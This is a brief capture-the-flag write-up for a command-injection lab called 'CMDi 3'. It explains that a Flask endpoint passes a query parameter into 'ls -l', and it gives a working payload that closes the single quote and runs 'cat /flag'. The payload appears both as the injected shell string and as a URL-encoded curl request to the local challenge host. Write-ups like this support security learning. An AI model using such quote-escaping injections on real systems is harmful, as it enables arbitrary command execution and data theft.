# CMDi 3

```shell
cat /challenge/server
```

The Flask app takes a directory as query param (`/trial?storage-path`) and executes `ls -l '{storage-path}'`
Injection has to take care of `'`

Executing: \
ls -l '**.'; cat /flag; echo 'yayy**'

Start the server and use curl:

```shell
curl http://challenge.localhost:80/trial?storage-path=.%27%3B%20cat%20%2Fflag%3B%20echo%20%27yayy
```
